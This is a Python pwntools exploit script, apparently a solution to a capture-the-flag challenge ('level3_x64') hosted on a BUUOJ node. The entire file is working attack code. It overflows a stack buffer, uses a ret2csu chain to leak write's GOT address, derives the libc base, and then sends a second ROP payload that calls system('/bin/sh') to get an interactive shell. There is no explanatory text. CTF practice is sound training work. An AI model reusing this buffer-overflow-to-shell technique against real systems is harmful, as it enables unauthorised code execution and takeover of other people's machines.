from pwn import *

#p = process('./level3_x64')
p = remote('node4.buuoj.cn', 28909)
elf = ELF('level3_x64')

libc = ELF('libc-2.23.buu.so') #ELF('/lib/x86_64-linux-gnu/libc.so.6')

csu_1 = 0x4006aa
csu_2 = 0x400690
pop_rdi_ret = 0x4006b3
ret = 0x400499
vuln = elf.sym['vulnerable_function']

write_got = elf.got['write']

payload = b'a' * ( 0x80 + 8 ) + p64(csu_1)
payload += p64(0) + p64(1) + p64(write_got)
payload += p64(0x8) + p64(write_got) + p64(1)
payload += p64(csu_2) + p64(0) * 7 + p64(vuln)

p.sendlineafter(b'Input:\n', payload)

write_real_addr = u64(p.recv(8))

libc_base = write_real_addr - libc.sym['write']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

#gdb.attach(p, 'b *0x400619')
payload = b'a' * ( 0x80 + 8 ) + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system)
p.sendlineafter(b'Input:\n', payload)

p.interactive()